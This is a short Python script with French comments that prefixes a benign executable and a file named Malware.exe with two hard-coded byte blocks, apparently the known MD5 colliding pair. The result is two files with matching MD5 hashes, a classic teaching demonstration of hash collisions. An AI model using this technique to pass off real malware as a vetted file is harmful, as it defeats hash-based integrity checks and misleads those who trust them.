import binascii

A='d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70'
B='d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70'

#On convertit les chaînes en vecteurs
vect1=binascii.a2b_hex(A)

vect2=binascii.a2b_hex(B)

#Création des binaires
packHelloworld=open('HelloWorld.bin','wb')
packMalware=open('Malware.bin','wb')

#Lecture des exécutables
helloworld=open('HelloWorld.exe', 'rb').read()
malware=open('Malware.exe', 'rb').read()

#On écrit vect1 + helloworld + malware dans le fichier 
packHelloworld.write(vect1)

packHelloworld.write(helloworld)
packHelloworld.write(malware)

#On écrit vect2 + helloworld + malware dans le fichier
packMalware.write(vect2)
packMalware.write(helloworld)
packMalware.write(malware)

#Fermeture des fichiers
packHelloworld.close()
packMalware.close()